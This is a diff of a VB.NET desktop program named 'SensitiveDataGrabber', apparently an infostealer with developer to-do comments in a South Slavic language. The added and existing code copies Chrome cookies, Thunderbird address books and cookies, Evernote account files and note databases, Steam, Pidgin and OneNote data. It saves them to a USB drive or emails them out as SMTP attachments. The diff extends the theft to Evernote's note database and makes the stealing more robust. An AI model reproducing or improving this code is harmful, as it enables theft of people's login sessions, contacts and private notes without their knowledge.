@@ -30,15 +30,17 @@ Public Class MainForm
     Dim chromeDirectory As String = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data\Default"
     Dim evernoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Evernote\Evernote\Databases"
     Dim pidginDirectory As String = "C:\Users\" & username & "\AppData\Roaming\.purple\"
-    Dim oneNoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Microsoft\OneNote\15.0\Backup\"
+    Dim oneNoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Microsoft\OneNote\"
     Dim steamDirectory As String = "C:\Program Files (x86)\Steam\config\"
     Dim WoTDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Wargaming.net\WorldofTanks"
 
-    ' temporary file for basic info
+    ' temporary file for getBasicInfo()
     Dim temporary As String = System.IO.Path.GetTempFileName()
 
     Private Function checkIfInstalled(ByVal software As String) As String
-        Dim regPath As String = ""
+
+        ' Checks the registry to see if compatible programs are installed.
+        Dim regPath As String = String.Empty
         Dim regkey As RegistryKey
         Select Case software
             Case "Chrome"
@@ -68,6 +70,7 @@ Public Class MainForm
 
     End Function
     Private Function getUSBLetter()
+        ' Checks to see removable drive letter.
         For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
             If d.DriveType = DriveType.Removable Then
                 driveLetter = d.Name
@@ -90,9 +93,7 @@ Public Class MainForm
         ' OS version
         Dim OSMajor As String = Environment.OSVersion.Version.Major.ToString
         Dim OSMinor As String = Environment.OSVersion.Version.Minor.ToString
-
         Dim getOSVersion As String = String.Empty
-
         If OSMajor = 5 And OSMinor = 0 Then getOSVersion = "Windows 2000"
         If OSMajor = 5 And OSMinor = 1 Then getOSVersion = "Windows XP (x86)"
         If OSMajor = 5 And OSMinor = 2 Then getOSVersion = "Windows XP (x64)"
@@ -150,7 +151,6 @@ Public Class MainForm
     Private Function getChrome()
 
         If method = "1" Then
-            MessageBox.Show("test3")
             If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Chrome") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Chrome")
             File.Copy(chromeDirectory & "\Bookmarks", driveLetter & "SensitiveDataGrabber\Chrome\bookmarks.txt", True)
             File.Copy(chromeDirectory & "\Cookies", driveLetter & "SensitiveDataGrabber\Chrome\cookies.sqlite", True)
@@ -180,16 +180,33 @@ Public Class MainForm
     End Function
 
     Private Function getEvernote()
+
+        Dim wholeLine As String = String.Empty
+        Dim evernoteUsername As String = String.Empty
+
         If method = "1" Then
             If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Evernote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Evernote")
             File.Copy(evernoteDirectory & "\.accounts", driveLetter & "SensitiveDataGrabber\Evernote\accountinfo.txt", True)
-            ' Trebaće mi korisničko ime.
-            ' Korisničko ime se nalazi unutar .accounts fajla.
-            ' Završava se sa znakom ;
+
+            Using sr As StreamReader = New StreamReader(evernoteDirectory & "\.accounts")
+                wholeLine = sr.ReadLine
+            End Using
+
+            For i = 1 To wholeLine.Length
+                If wholeLine(i - 1) <> ";" Then
+                    evernoteUsername = evernoteUsername + wholeLine(i - 1)
+                Else
+                    Exit For
+                End If
+            Next
+
+            File.Copy(evernoteDirectory & "\" & evernoteUsername & ".exb", driveLetter & "SensitiveDataGrabber\Evernote\notesdump.exb", True)
 
         ElseIf method = "2" Then
             Dim evernoteAccounts As Attachment = New Attachment(evernoteDirectory & "\.accounts", "text/plain")
+            Dim evernoteDatabase As Attachment = New Attachment(evernoteDirectory & "\" & evernoteUsername & ".exb", "text/plain")
             mail.Attachments.Add(evernoteAccounts)
+            mail.Attachments.Add(evernoteDatabase)
         Else
 
         End If
@@ -257,7 +274,7 @@ Public Class MainForm
     Private Function getOneNote()
         If method = "1" Then
             If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\OneNote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\OneNote")
-            My.Computer.FileSystem.CopyDirectory(oneNoteDirectory, driveLetter & "SensitiveDataGrabber\OneNote\", True)
+            If Directory.Exists(oneNoteDirectory & "15.0\Backup") Then My.Computer.FileSystem.CopyDirectory(oneNoteDirectory & "15.0\Backup", driveLetter & "SensitiveDataGrabber\OneNote\", True)
         ElseIf method = "2" Then
 
         Else
@@ -282,16 +299,23 @@ Public Class MainForm
     Private Function getThunderbird()
         If method = "1" Then
             If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Thunderbird") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Thunderbird")
-            File.Copy(thunderbirdDirectory & "abook.mab", driveLetter & "SensitiveDataGrabber\Thunderbird\addressbook.mab", True)
-            File.Copy(thunderbirdDirectory & "addons.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\addons.sqlite", True)
-            File.Copy(thunderbirdDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\cookies.sqlite", True)
+            If File.Exists(thunderbirdDirectory & "abook.mab") Then File.Copy(thunderbirdDirectory & "abook.mab", driveLetter & "SensitiveDataGrabber\Thunderbird\addressbook.mab", True)
+            If File.Exists(thunderbirdDirectory & "addons.sqlite") Then File.Copy(thunderbirdDirectory & "addons.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\addons.sqlite", True)
+            If File.Exists(thunderbirdDirectory & "cookies.sqlite") Then File.Copy(thunderbirdDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\cookies.sqlite", True)
         ElseIf method = "2" Then
-            Dim thunderbirdAddressBook As Attachment = New Attachment(thunderbirdDirectory & "abook.mab")
-            Dim thunderbirdAddons As Attachment = New Attachment(thunderbirdDirectory & "addons.sqlite")
-            Dim thunderbirdCookies As Attachment = New Attachment(thunderbirdDirectory & "cookies.sqlite")
-            mail.Attachments.Add(thunderbirdAddressBook)
-            mail.Attachments.Add(thunderbirdAddons)
-            mail.Attachments.Add(thunderbirdCookies)
+            If File.Exists(thunderbirdDirectory & "abook.mab") Then
+                Dim thunderbirdAddressBook As Attachment = New Attachment(thunderbirdDirectory & "abook.mab")
+                mail.Attachments.Add(thunderbirdAddressBook)
+            End If
+            If File.Exists(thunderbirdDirectory & "addons.sqlite") Then
+                Dim thunderbirdAddons As Attachment = New Attachment(thunderbirdDirectory & "addons.sqlite")
+                mail.Attachments.Add(thunderbirdAddons)
+            End If
+            If File.Exists(thunderbirdDirectory & "cookies.sqlite") Then
+                Dim thunderbirdCookies As Attachment = New Attachment(thunderbirdDirectory & "cookies.sqlite")
+                mail.Attachments.Add(thunderbirdCookies)
+            End If
+            
         Else
 
         End If
@@ -383,6 +407,9 @@ Public Class MainForm
 
         If RadioButton1.Checked = True Then
             method = "1"
+            Button1.Enabled = False
+            Button1.Text = "Working"
+
             If chkFirefox.Checked = True Then
                 firefoxDirectory = getFirefoxDirectory()
                 getFirefox()
@@ -432,15 +459,32 @@ Public Class MainForm
                 Button1.Enabled = True
             End If
 
+            Button1.Enabled = True
+            Button1.Text = "Work"
+            MessageBox.Show("Done!")
+
         ElseIf RadioButton2.Checked = True Then
             method = "2"
+            Button1.Enabled = False
+            Button1.Text = "Working"
+
             MessageBox.Show(emailSMTPServer & vbCrLf & emailSMTPPort & vbCrLf & emailSenderEmail & vbCrLf &
                          emailSenderPassword & vbCrLf & emailReciever & vbCrLf & emailDefaultSubject)
-            getBasicInfo()
 
-            getChrome()
+            getBasicInfo()
+            If chkChrome.Checked = True Then getChrome()
+            If chkFirefox.Checked = True Then getFirefox()
+            If chkThunderbird.Checked = True Then getThunderbird()
+            If chkSteam.Checked = True Then getSteam()
+            If chkPidgin.Checked = True Then getPidgin()
+            If chkEvernote.Checked = True Then getEvernote()
+            If chkWoT.Checked = True Then getWoT()
 
             sendMail()
+
+            Button1.Enabled = True
+            Button1.Text = "Work"
+
         ElseIf RadioButton3.Checked = True Then
 
         Else
@@ -500,9 +544,9 @@ Public Class MainForm
     ' ============================================================================================
     ' ================ URADITI ================ URADITI =============== URADITI ==================
     ' ============================================================================================
-    ' ======= Provjeravaj da li je program instaliran iz registra, ne iz explorera.        =======
     ' ======= Testirati program u virtuelnoj mašini.                                       =======
     ' ======= Trebace smisliti rjesenje za slanje foldera kao attachment.                  =======
+    ' ======= Podesiti text na button1 tako da pokazuje working dok program radi nesto.    =======
     ' ============================================================================================
     ' ============================================================================================
 
